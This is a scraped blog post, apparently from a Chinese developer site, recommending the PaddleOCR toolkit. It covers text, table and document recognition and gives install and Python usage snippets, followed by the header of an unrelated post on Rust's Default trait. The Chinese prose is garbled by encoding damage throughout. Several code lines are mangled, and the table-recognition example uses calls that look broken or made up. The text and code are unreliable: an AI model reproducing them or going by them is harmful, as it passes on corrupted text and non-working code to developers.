<li>ä¸€å †çº¸è´¨å‘ç¥¨ã€æŠ¥é”€å•ï¼Œè´¢åŠ¡è¦å½•å…¥ç³»ç»Ÿï¼Œçœ¼ç›çœ‹èŠ±ã€æ‰‹æŒ‡å‘éº»ï¼›</li>
<li>å­©å­çš„æ‰‹å†™ä½œä¸šæƒ³å­˜ä¸ªç”µå­ç‰ˆï¼Œåˆä¸æƒ³å†æ‰“ä¸€éã€‚</li>
</ul>
<p>è¿™äº›åœºæ™¯éƒ½æœ‰ä¸€ä¸ªå…±åŒç‚¹ï¼šè¦ä»å›¾ç‰‡æˆ–æ‰«æä»¶é‡Œï¼ŒæŠŠæ–‡å­—â€œæ‹¿å‡ºæ¥â€ã€‚è¦ä¹ˆé æ‰‹å·¥ï¼Œè¦ä¹ˆèŠ±é’±ä¹°å„ç§åœ¨çº¿ OCR æœåŠ¡ï¼Œæ¬¡æ•°å—é™ã€æ ¼å¼ä¹±ã€‚</p>
<p>ç›´åˆ°é‡è§ PaddleOCRï¼Œæ‰è§‰å¾—è¿™ç§é‡å¤åŠ³åŠ¨ï¼Œç»ˆäºæœ‰å·¥å…·èƒ½å¸®ä¸Šå¤§å¿™äº†ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/157a0344d3d2486cba03d69f49e2a11a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf56m656CB5a2X:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769477820&amp;x-signature=gtuwBm2aHSmnmLEBQtRG57NPBh8%3D" alt="PP-OCRv5 Demo" loading="lazy"/></p>
<h3 data-id="heading-0">ğŸ¤”Â PaddleOCR åˆ°åº•æ˜¯ä»€ä¹ˆï¼Ÿ</h3>
<p>ç®€å•è¯´ï¼Œå®ƒæ˜¯ç™¾åº¦å¼€æºçš„ä¸€å¥—Â <strong>OCR å·¥å…·ç®± + æ–‡æ¡£è§£æå¼•æ“</strong>ã€‚</p>
<p>å®ƒä¸ä»…èƒ½è¯†åˆ«å›¾ç‰‡é‡Œçš„æ–‡å­—ï¼Œè¿˜èƒ½å¤„ç†è¡¨æ ¼ã€æ–‡æ¡£ç‰ˆé¢ï¼Œç”šè‡³æ”¯æŒå¤šè¯­è¨€ã€æ‰‹å†™ä½“ã€‚æœ€å…³é”®æ˜¯ï¼Œå®ƒå¼€æºå…è´¹ã€æ¨¡å‹å¯ä»¥æœ¬åœ°éƒ¨ç½²ï¼Œéå¸¸å‹å¥½ã€‚</p>
<p>ä»æŠ€æœ¯æ¶æ„ä¸Šçœ‹ï¼Œå®ƒéµå¾ªç»å…¸çš„â€œæ£€æµ‹â€”è¯†åˆ«â€”ç»“æ„åŒ–â€æµç¨‹ï¼š</p>
<ol>
<li><strong>æ–‡æœ¬æ£€æµ‹</strong>ï¼šå…ˆç”¨ç®—æ³•æ‰¾å‡ºå›¾ç‰‡é‡Œæ–‡å­—çš„ä½ç½®ï¼Œå“ªæ€•æ­ªæ­ªæ‰­æ‰­ã€é€è§†å˜å½¢ä¹Ÿèƒ½æå®šã€‚</li>
<li><strong>æ–¹å‘åˆ†ç±»</strong>ï¼šè‡ªåŠ¨åˆ¤æ–­æ–‡å­—æ˜¯æ­£çš„è¿˜æ˜¯å€’çš„ã€æ¨ªç€è¿˜æ˜¯ç«–ç€ï¼Œå¹¶çº æ­£è¿‡æ¥ã€‚</li>
<li><strong>æ–‡æœ¬è¯†åˆ«</strong>ï¼šæŠŠå®šä½å¥½çš„æ–‡å­—å—ï¼Œè½¬æˆå¯ç¼–è¾‘çš„æ–‡æœ¬ï¼Œæ”¯æŒä¸­æ–‡ã€è‹±æ–‡ã€æ•°å­—ï¼Œç”šè‡³æ‰‹å†™ä½“ã€‚</li>
<li><strong>ç»“æ„åŒ–è¾“å‡º</strong>ï¼šå¯¹äºè¡¨æ ¼ï¼Œå®ƒèƒ½è¿˜åŸæˆè¡Œåˆ—ç»“æ„ï¼Œç›´æ¥å¯¼å‡ºä¸º Excelï¼›å¯¹äºæ–‡æ¡£ï¼Œèƒ½åˆ†æå‡ºæ ‡é¢˜ã€æ®µè½ã€è¡¨æ ¼ç­‰å¸ƒå±€ã€‚</li>
</ol>
<p>è¿™ä¸ªæµç¨‹èƒŒåæ˜¯ PP-OCR ç³»åˆ—æ¨¡å‹ï¼Œä»æ—©æœŸç‰ˆæœ¬åˆ°ç°åœ¨çš„ PP-OCRv5ï¼Œä¸€ç›´åœ¨â€œç²¾åº¦ã€é€Ÿåº¦ã€ä½“ç§¯â€ä¹‹é—´æ‰¾å¹³è¡¡ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0c5832c39c084e87a7f68cb98789acf7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf56m656CB5a2X:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769477820&amp;x-signature=r79izkeg%2F3Lz1fccbpE1lQkjy48%3D" alt="PP-StructureV3 Demo" loading="lazy"/></p>
<h3 data-id="heading-1">ğŸš€ å®ƒåˆ°åº•èƒ½åšä»€ä¹ˆï¼Ÿ</h3>
<p>èŠèŠå‡ ä¸ªè®©æˆ‘å°è±¡å¾ˆæ·±çš„åŠŸèƒ½ã€‚</p>
<h4 data-id="heading-2">1. å›¾ç‰‡æ–‡å­—è¯†åˆ«ï¼šå‘Šåˆ«æ‰‹æŠ„</h4>
<p>è¿™æ˜¯æœ€åŸºç¡€çš„åŠŸèƒ½ï¼Œä½†æ•ˆæœå¾ˆæ‰å®ã€‚æ— è®ºæ˜¯æ‰‹æœºæ‹çš„èœå•ã€è·¯ç‰Œï¼Œè¿˜æ˜¯ç”µè„‘é‡Œçš„æˆªå›¾ã€PDF æ‰«æé¡µï¼Œå®ƒéƒ½èƒ½å¿«é€Ÿæå–æ–‡å­—ï¼Œå¹¶æŒ‰é¡ºåºæ’å¥½ã€‚</p>
<p>æŠ€æœ¯ä¸Šï¼Œå®ƒé€šè¿‡ DB æ–‡æœ¬æ£€æµ‹ç®—æ³•å’Œ CRNN/Transformer è¯†åˆ«ç½‘ç»œï¼Œå¯¹æ¨¡ç³Šã€å€¾æ–œã€ä½åˆ†è¾¨ç‡çš„å›¾ç‰‡æœ‰å¾ˆå¥½çš„é²æ£’æ€§ã€‚ä¸€äº›å…‰çº¿å¾ˆå·®çš„è€ç…§ç‰‡ï¼Œå®ƒä¾ç„¶èƒ½è®¤å‡ºå¤§éƒ¨åˆ†å†…å®¹ï¼Œåªæ˜¯ç½®ä¿¡åº¦ä¼šä½ä¸€äº›ï¼Œéœ€è¦äººå·¥æ ¡å¯¹å…³é”®å­—æ®µã€‚</p>
<h4 data-id="heading-3">2. è¡¨æ ¼è¯†åˆ«ï¼šæ‰«æä»¶ç§’å˜ Excel</h4>
<p>å¾ˆå¤šå®¢æˆ·å‘æ¥çš„æŠ¥ä»·å•ã€å¯¹è´¦å•éƒ½æ˜¯æ‰«æç‰ˆ PDFï¼Œä»¥å‰ç”¨åœ¨çº¿å·¥å…·è½¬æ¢ï¼Œè¡¨æ ¼çº¿æ­ªä¸ƒæ‰­å…«ï¼Œåˆå¹¶å•å…ƒæ ¼å…¨ä¹±äº†ï¼Œè¿˜å¾—æ‰‹åŠ¨è°ƒæ•´åŠå¤©ã€‚</p>
<p>PaddleOCR çš„è¡¨æ ¼è¯†åˆ«æ˜¯â€œæ£€æµ‹+è¯†åˆ«â€ä¸¤æ­¥èµ°ï¼šå…ˆæ‰¾åˆ°è¡¨æ ¼åŒºåŸŸï¼Œå†åˆ†ææ¯ä¸ªå•å…ƒæ ¼çš„å†…å®¹å’Œä½ç½®å…³ç³»ï¼Œæœ€åè¾“å‡ºç»“æ„åŒ–çš„ JSON æˆ– Excel æ–‡ä»¶ã€‚</p>
<h4 data-id="heading-4">3. æ–‡æ¡£è§£æï¼šå¤æ‚ç‰ˆå¼ä¹Ÿä¸æ€•</h4>
<p>å¦‚æœä½ ç»å¸¸å¤„ç†è®ºæ–‡ã€æŠ€æœ¯æ‰‹å†Œã€åˆåŒç­‰é•¿æ–‡æ¡£ï¼ŒPP-StructureV3 å’Œ PP-DocTranslation è¿™ä¸¤ä¸ªåŠŸèƒ½ä¼šå¾ˆå®ç”¨ã€‚</p>
<ul>
<li>
<p><strong>PP-StructureV3</strong>ï¼šèƒ½åˆ†ææ–‡æ¡£çš„ç‰ˆé¢ç»“æ„ï¼Œè¯†åˆ«æ ‡é¢˜ã€æ®µè½ã€è¡¨æ ¼ã€å›¾è¡¨ã€å…¬å¼ç­‰å…ƒç´ ï¼Œå¹¶ä¿ç•™å®ƒä»¬çš„å±‚çº§å…³ç³»ã€‚å¯¹äºå¤šæ å¸ƒå±€ã€åµŒå¥—è¡¨æ ¼ã€ç«–æ’æ–‡æœ¬ï¼Œå®ƒéƒ½èƒ½å¤„ç†å¾—ä¸é”™ã€‚</p>
</li>
<li>
<p><strong>PP-DocTranslation</strong>ï¼šåœ¨ OCR çš„åŸºç¡€ä¸Šï¼Œç»“åˆæ–‡å¿ƒå¤§æ¨¡å‹ï¼Œå®ç°ç«¯åˆ°ç«¯çš„æ–‡æ¡£ç¿»è¯‘ã€‚å®ƒä¸ä»…èƒ½ç¿»è¯‘æ–‡å­—ï¼Œè¿˜èƒ½ä¿æŒåŸæ–‡æ¡£çš„æ ¼å¼ï¼Œæ¯”å¦‚æ ‡é¢˜å±‚çº§ã€è¡¨æ ¼ç»“æ„ã€å…¬å¼ä½ç½®ç­‰ã€‚</p>
</li>
</ul>
<h4 data-id="heading-5">4. å¤šè¯­è¨€ä¸æ‰‹å†™ä½“ï¼šè¦†ç›–æ›´å¤šåœºæ™¯</h4>
<p>PaddleOCR çš„å¤šè¯­è¨€èƒ½åŠ›ä¹Ÿå¾ˆå¼ºã€‚PP-OCRv5 æ¨¡å‹æ”¯æŒå¤šç§è¯­è¨€ï¼Œå¯¹äºæ··åˆè¯­è¨€æ–‡æ¡£ï¼Œå®ƒèƒ½è‡ªåŠ¨è¯†åˆ«è¯­è¨€ç±»å‹ï¼Œåˆ‡æ¢è¯†åˆ«æ¨¡å¼ï¼Œæ•ˆæœæ¯”å•è¯­ç§æ¨¡å‹å¥½å¾ˆå¤šã€‚</p>
<p>æ‰‹å†™ä½“è¯†åˆ«æ–¹é¢ï¼Œå®ƒæ”¯æŒå¤æ‚è¿ç¬”ã€éè§„èŒƒå­—è¿¹ï¼Œåœ¨ CASIA-HWDB ç­‰æ•°æ®é›†ä¸Šçš„è¯†åˆ«å‡†ç¡®ç‡èƒ½è¾¾åˆ° 90% ä»¥ä¸Šã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c5c5eafd66db4e0590b65bed34e6924f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf56m656CB5a2X:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769477820&amp;x-signature=%2FwgDGGSEx3EQjSAwMfUF6IfNf64%3D" alt="PP-StructureV3 Demo" loading="lazy"/></p>
<h3 data-id="heading-6">ğŸ’» ä½¿ç”¨ä½“éªŒå¦‚ä½•ï¼Ÿ</h3>
<h4 data-id="heading-7">1. å®‰è£…ä¸ä¸Šæ‰‹ï¼šå¯¹æ–°æ‰‹å‹å¥½</h4>
<p>PaddleOCR çš„å®‰è£…éå¸¸ç®€å•ï¼Œç”¨ pip ä¸€æ¡å‘½ä»¤å°±èƒ½æå®šï¼š</p>
<pre><code class="hljs">pipÂ install paddlepaddle paddleocr
</code></pre>
<h4 data-id="heading-8">2. ä»£ç ç¤ºä¾‹ï¼šå‡ è¡Œä»£ç å®ç°åŠŸèƒ½</h4>
<p>PaddleOCR çš„ Python API è®¾è®¡å¾—å¾ˆç®€æ´ï¼Œå‡ è¡Œä»£ç å°±èƒ½å®ç°æ–‡å­—è¯†åˆ«ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino">pythonfromÂ paddleocrÂ <span class="hljs-keyword">import</span>Â PaddleOCR
</code></pre>
<p>åˆå§‹åŒ–OCRï¼ˆæ”¯æŒå¤šè¯­è¨€ï¼Œå¦‚'en'ã€'ch'ã€'fr'ç­‰ï¼‰</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">ocr</span>Â = PaddleOCR(use_angle_cls=<span class="hljs-literal">True</span>, lang=<span class="hljs-string">"ch"</span>)
</code></pre>
<p>è¯†åˆ«å›¾ç‰‡ä¸­çš„æ–‡å­—</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">result</span>Â = ocr.ocr(<span class="hljs-string">'test.jpg'</span>, cls=<span class="hljs-literal">True</span>)
</code></pre>
<p>è¾“å‡ºç»“æœï¼ˆåŒ…å«åæ ‡ã€æ–‡æœ¬ã€ç½®ä¿¡åº¦ï¼‰</p>
<pre><code class="hljs language-ini" lang="ini">forÂ line in result:print(line<span class="hljs-section">[1]</span><span class="hljs-section">[0]</span>) Â <span class="hljs-comment"># æ–‡æœ¬å†…å®¹</span>
</code></pre>
<p>å¯¹äºè¡¨æ ¼è¯†åˆ«ï¼Œåªéœ€è¦æ·»åŠ Â <code>table_engine=True</code>å‚æ•°ï¼Œå°±èƒ½ç›´æ¥å¯¼å‡º Excel æ–‡ä»¶ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino">pythonfromÂ paddleocrÂ <span class="hljs-keyword">import</span>Â PaddleOCR, draw_table_result
</code></pre>
<p>åˆå§‹åŒ–è¡¨æ ¼è¯†åˆ«æ¨¡å‹</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">table_engine</span>Â = PaddleOCR(use_angle_cls=<span class="hljs-literal">True</span>, lang=<span class="hljs-string">"ch"</span>, table_engine=<span class="hljs-literal">True</span>)
</code></pre>
<p>è¯†åˆ«è¡¨æ ¼å¹¶è¾“å‡ºExcel</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">result</span>Â = table_engine.table_ocr(<span class="hljs-string">'table.jpg'</span>, output=<span class="hljs-string">'output.xlsx'</span>)
</code></pre>
<p>å¯è§†åŒ–ç»“æœ</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">img</span>Â = draw_table_result(<span class="hljs-string">'table.jpg'</span>, result)img.save(<span class="hljs-string">'table_result.jpg'</span>)
</code></pre>
<h4 data-id="heading-9">4. è‡ªå®šä¹‰è®­ç»ƒï¼šæ»¡è¶³ä¸ªæ€§åŒ–éœ€æ±‚</h4>
<p>å¦‚æœé¢„è®­ç»ƒæ¨¡å‹ä¸èƒ½æ»¡è¶³ä½ çš„éœ€æ±‚ï¼ˆæ¯”å¦‚è¯†åˆ«ç‰¹å®šå­—ä½“ã€è¡Œä¸šæœ¯è¯­ï¼‰ï¼ŒPaddleOCR æ”¯æŒè‡ªå®šä¹‰è®­ç»ƒã€‚</p>
<p>ä½ åªéœ€è¦å‡†å¤‡è‡ªå·±çš„æ•°æ®é›†ï¼Œç”¨å®˜æ–¹æä¾›çš„Â <code>tools/train.py</code>è„šæœ¬è¿›è¡Œå¾®è°ƒï¼Œå°±èƒ½å¾—åˆ°ä¸€ä¸ªé€‚åˆè‡ªå·±åœºæ™¯çš„æ¨¡å‹ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5adc725cbb9042cd937a4681b64699fe~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf56m656CB5a2X:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769477820&amp;x-signature=CF8jBKySjzC1cLvbNj7%2FBCFOyns%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<h3 data-id="heading-10">ğŸŒŸÂ ä¸ºä»€ä¹ˆæ¨èå®ƒï¼Ÿ</h3>
<p>æ¨è PaddleOCRï¼Œä¸æ˜¯å› ä¸ºå®ƒâ€œå®Œç¾â€ï¼Œè€Œæ˜¯å› ä¸ºå®ƒâ€œå®ç”¨â€ã€‚</p>
<h4 data-id="heading-11">1. å¼€æºå…è´¹</h4>
<p>PaddleOCR é‡‡ç”¨ Apache 2.0 å¼€æºåè®®ï¼Œå¯ä»¥å…è´¹ä½¿ç”¨ã€‚å¾ˆå¤šå…¬å¸çš„æŠ¥é”€ç³»ç»Ÿã€æ–‡æ¡£ç®¡ç†å·¥å…·éƒ½ç”¨å®ƒåšåº•å±‚è¯†åˆ«å¼•æ“ï¼Œè¿™è¶³ä»¥è¯´æ˜å®ƒçš„å¯é æ€§ã€‚</p>
<h4 data-id="heading-12">2. åŠŸèƒ½å…¨é¢ï¼Œè¦†ç›–å¤šåœºæ™¯</h4>
<p>ä»åŸºç¡€çš„æ–‡å­—è¯†åˆ«ï¼Œåˆ°å¤æ‚çš„è¡¨æ ¼è§£æã€æ–‡æ¡£ç¿»è¯‘ï¼Œå†åˆ°å¤šè¯­è¨€ã€æ‰‹å†™ä½“æ”¯æŒï¼ŒPaddleOCR å‡ ä¹è¦†ç›–äº†æ‰€æœ‰å¸¸è§çš„ OCR åœºæ™¯ã€‚</p>
<h4 data-id="heading-13">3. ç¤¾åŒºæ´»è·ƒï¼ŒæŒç»­è¿­ä»£</h4>
<p>PaddleOCR çš„ GitHub æ˜Ÿæ ‡æ•°å·²ç»è¶…è¿‡ 6 ä¸‡ï¼Œç¤¾åŒºéå¸¸æ´»è·ƒã€‚ç™¾åº¦å›¢é˜ŸæŒç»­è¿­ä»£ï¼Œä» PP-OCRv3 åˆ° PP-OCRv5ï¼Œå†åˆ° PP-StructureV3ã€PP-DocTranslationï¼Œä¸æ–­æ¨å‡ºæ–°åŠŸèƒ½ã€ä¼˜åŒ–æ€§èƒ½ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/25e971009dd84e18b2a9622649e0b34d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf56m656CB5a2X:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769477820&amp;x-signature=tw9YF8xvcM20%2FkPua6naVnDs1gg%3D" alt="PaddleOCR Architecture" loading="lazy"/></p>
<h3 data-id="heading-14">æœ€å</h3>
<p>PaddleOCR ä¸æ˜¯ä¸€ä¸ªâ€œé«˜å¤§ä¸Šâ€çš„ AI é¡¹ç›®ï¼Œè€Œæ˜¯ä¸€ä¸ªâ€œèƒ½è§£å†³å®é™…é—®é¢˜â€çš„å·¥å…·ã€‚å®ƒèƒ½å¸®åŠ©ä»é‡å¤åŠ³åŠ¨ä¸­è§£æ”¾å‡ºæ¥ï¼Œæœ‰æ›´å¤šæ—¶é—´å»åšæ›´æœ‰åˆ›é€ æ€§çš„äº‹æƒ…ã€‚</p>
<p>å¦‚æœä½ ä¹Ÿè¢«â€œæ‰‹æŠ„æ–‡å­—ã€æ‰‹åŠ¨å½•æ•°æ®â€æŠ˜ç£¨è¿‡ï¼Œä¸å¦¨è¯•è¯• PaddleOCRã€‚å®ƒå¯èƒ½ä¸ä¼šè®©ä½ â€œç¬é—´çˆ±ä¸Šå·¥ä½œâ€ï¼Œä½†è‡³å°‘èƒ½è®©ä½ å°‘æ‰å¾ˆå¤šä¸å¿…è¦çš„éº»çƒ¦ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/35cbb91a9213485a8c54ef3e3c1b8854~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf56m656CB5a2X:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769477820&amp;x-signature=OiYy3uDdcnFLrIN65X0SxKo%2FBbY%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<h3 data-id="heading-15">å¼€æºç¤¾åŒº</h3>
<pre><code class="hljs language-bash" lang="bash">GitHubï¼šhttps://github.com/PaddlePaddle/PaddleOCRPaddleOCRå®˜æ–¹ï¼šhttps://aistudio.baidu.com/paddleocr
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5d2ca538fd1c4d8b8e491eafce301021~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf56m656CB5a2X:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769477820&amp;x-signature=5qoQ0lcLtrTx9cyA%2Fz6xio5TYzI%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p><strong>è°¢è°¢ä½ çœ‹æˆ‘çš„æ–‡ç« ï¼Œæ—¢ç„¶çœ‹åˆ°è¿™é‡Œäº†ï¼Œå¦‚æœè§‰å¾—ä¸é”™ï¼Œéšæ‰‹ç‚¹ä¸ªèµã€è½¬å‘ã€åœ¨çœ‹ä¸‰è¿å§ï¼Œæ„Ÿè°¢æ„Ÿè°¢ã€‚é‚£æˆ‘ä»¬ï¼Œä¸‹æ¬¡å†è§ã€‚</strong></p>
<p>æ‚¨çš„ä¸€é”®ä¸‰è¿ï¼Œæ˜¯æˆ‘æ›´æ–°çš„æœ€å¤§åŠ¨åŠ›ï¼Œè°¢è°¢</p>
<p>å±±æ°´æœ‰ç›¸é€¢ï¼Œæ¥æ—¥çš†å¯æœŸï¼Œè°¢è°¢é˜…è¯»ï¼Œæˆ‘ä»¬å†ä¼š</p>
<p>æˆ‘æ‰‹ä¸­çš„é‡‘ç®æ£’ï¼Œä¸Šèƒ½é€šå¤©ï¼Œä¸‹èƒ½æ¢æµ·</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Defaultï¼šRust é‡Œæœ€çœäº‹çš„åˆå§‹åŒ–æ–¹å¼]]></title>    <link>https://juejin.cn/post/7596943803934359592</link>    <guid>https://juejin.cn/post/7596943803934359592</guid>    <pubDate>2026-01-20T02:34:51.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596943803934359592" data-draft-id="7596943803934310440" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Defaultï¼šRust é‡Œæœ€çœäº‹çš„åˆå§‹åŒ–æ–¹å¼"/> <meta itemprop="keywords" content="åç«¯,Rust"/> <meta itemprop="datePublished" content="2026-01-20T02:34:51.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å™—å™œå™—å™œå•ª"/> <meta itemprop="url" content="https://juejin.cn/user/4037062427148462"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Defaultï¼šRust é‡Œæœ€çœäº‹çš„åˆå§‹åŒ–æ–¹å¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4037062427148462/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å™—å™œå™—å™œå•ª
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T02:34:51.000Z" title="Tue Jan 20 2026 02:34:51 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä½ æœ‰æ²¡æœ‰é‡åˆ°è¿‡è¿™ç§æƒ…å†µï¼šåˆ›å»ºä¸€ä¸ªç»“æ„ä½“ï¼Œ20 ä¸ªå­—æ®µï¼Œä½†ä½ åªæƒ³æ”¹å…¶ä¸­ 2 ä¸ªï¼Œå‰©ä¸‹ 18 ä¸ªéƒ½å¾—æ‰‹å†™åˆå§‹åŒ–ï¼Ÿ</p>
